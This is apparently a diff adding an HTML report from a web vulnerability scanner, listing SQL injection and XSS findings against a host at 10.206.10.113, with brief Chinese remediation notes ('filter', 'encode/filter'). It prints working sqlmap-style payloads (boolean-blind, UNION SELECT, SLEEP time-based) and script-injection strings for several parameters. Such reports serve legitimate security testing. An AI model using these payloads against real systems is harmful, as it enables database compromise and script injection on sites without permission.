@@ -1,0 +1,112 @@
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Sandi Result Page</title>
+
+<style type="text/css">
+
+    html, body, div, span, object, iframe,
+    h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+    abbr, address, cite, code,
+    del, dfn, em, img, ins, kbd, q, samp,
+    small, strong, sub, sup, var,
+    b, i,
+    dl, dt, dd, ol, ul, li,
+    fieldset, form, label, legend,
+    table, caption, tbody, tfoot, thead, tr, th, td {
+        margin:0;
+        padding:0;
+        border:0;
+        outline:0;
+        font-size:100%;
+        vertical-align:baseline;
+        background:transparent;
+    }
+    
+    body {
+        margin:0;
+        padding:0;
+        font:12px/15px "Helvetica Neue",Arial, Helvetica, sans-serif;
+        color: #555;
+        background:#f5f5f5 url(bg.jpg);
+    }
+    
+    a {color:#666;}
+    
+    #content {width:85%; max-width:1000px; margin:1% auto 0;}
+    
+    /*
+    Pretty Table Styling
+    CSS Tricks also has a nice writeup: http://css-tricks.com/feature-table-design/
+    */
+    
+    table {
+        overflow:hidden;
+        border:1px solid #d3d3d3;
+        background:#fefefe;
+        width:100%;
+        margin:5% auto 0;
+        -moz-border-radius:5px; /* FF1+ */
+        -webkit-border-radius:5px; /* Saf3-4 */
+        border-radius:5px;
+        -moz-box-shadow: 0 0 4px rgba(0, 0, 0, 0.2);
+        -webkit-box-shadow: 0 0 4px rgba(0, 0, 0, 0.2);
+    }
+    
+    th, td {padding:18px 28px 18px; text-align:left; }
+    
+    th {padding-top:22px; text-shadow: 1px 1px 1px #fff; background:#e8eaeb;}
+    
+    td {border-top:1px solid #e0e0e0; border-right:1px solid #e0e0e0;}
+    
+    tr.odd-row td {background:#f6f6f6;}
+    
+    td.first, th.first {text-align:left}
+    
+    td.last {border-right:none;}
+    
+    /*
+    Background gradients are completely unnecessary but a neat effect.
+    */
+    
+    td {
+        background: -moz-linear-gradient(100% 25% 90deg, #fefefe, #f9f9f9);
+        background: -webkit-gradient(linear, 0% 0%, 0% 25%, from(#f9f9f9), to(#fefefe));
+    }
+    
+    tr.odd-row td {
+        background: -moz-linear-gradient(100% 25% 90deg, #f6f6f6, #f1f1f1);
+        background: -webkit-gradient(linear, 0% 0%, 0% 25%, from(#f1f1f1), to(#f6f6f6));
+    }
+    
+    th {
+        background: -moz-linear-gradient(100% 20% 90deg, #e8eaeb, #ededed);
+        background: -webkit-gradient(linear, 0% 0%, 0% 20%, from(#ededed), to(#e8eaeb));
+    }
+    
+
+
+</style>
+
+</head>
+<body>
+<center><h1>The result</h1></center>
+<div id="content"  style="margin:0 auto;text-align:center">
+
+    <table cellspacing="0"  >
+    <tr><th>url</th><th>type</th><th>parameter</th><th>description</th><th>solution</td></tr>
+    <tr><td>http://10.206.10.113/new.php?id=2</td><td>SQL injection</td><td> id</td><td>http://10.206.10.113/new.php?id=2<br>---<br>Place: GET<br>Parameter: id<br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: id=2 AND 5804=5804<br><br>    Type: UNION query<br>    Title: MySQL UNION query (NULL) - 6 columns<br>    Payload: id=-2391 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71656a7371,0x7a754365426850424265,0x716d686971),NULL,NULL#<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt; 5.0.11 AND time-based blind<br>    Payload: id=2 AND SLEEP(5)<br>---<br><br></td><td>过滤</td></tr>
+<tr><td>http://10.206.10.113/jobs.php?j_id=1</td><td>SQL injection</td><td> j_id</td><td>http://10.206.10.113/jobs.php?j_id=1<br>---<br>Place: GET<br>Parameter: j_id<br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: j_id=1 AND 6444=6444<br><br>    Type: UNION query<br>    Title: MySQL UNION query (NULL) - 9 columns<br>    Payload: j_id=-4671 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71667a6c71,0x5649685a4569774e6550,0x7178756871)#<br><br>    Type: AND/OR time-based blind<br>    Title: MySQL &gt; 5.0.11 AND time-based blind<br>    Payload: j_id=1 AND SLEEP(5)<br>---<br><br></td><td>过滤</td></tr>
+<tr><td>http://10.206.10.113/book.php</td><td>XSS</td><td> title</td><td>Maybe there is a XSS in post parameter title<br>from : http://10.206.10.113/book.php<br>to : http://10.206.10.113/book.php<br>Payload : &lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;//<br></td><td>编码/过滤</td></tr>
+<tr><td>http://10.206.10.113/book.php</td><td>XSS</td><td> name</td><td>Maybe there is a XSS in post parameter name<br>from : http://10.206.10.113/book.php<br>to : http://10.206.10.113/book.php<br>Payload : &lt;/textarea&gt;&lt;script&gt;alert(2)&lt;/script&gt;//<br></td><td>编码/过滤</td></tr>
+<tr><td>http://10.206.10.113/book.php</td><td>XSS</td><td> email</td><td>Maybe there is a XSS in post parameter email<br>from : http://10.206.10.113/book.php<br>to : http://10.206.10.113/book.php<br>Payload : &lt;/textarea&gt;&lt;script&gt;alert(3)&lt;/script&gt;//<br></td><td>编码/过滤</td></tr>
+<tr><td>http://10.206.10.113/book.php</td><td>XSS</td><td> ms</td><td>Maybe there is a XSS in post parameter ms<br>from : http://10.206.10.113/book.php<br>to : http://10.206.10.113/book.php<br>Payload : &lt;/textarea&gt;&lt;script&gt;alert(4)&lt;/script&gt;//<br></td><td>编码/过滤</td></tr>
+
+         </table>
+
+</div>
+
+</body>
+</html>
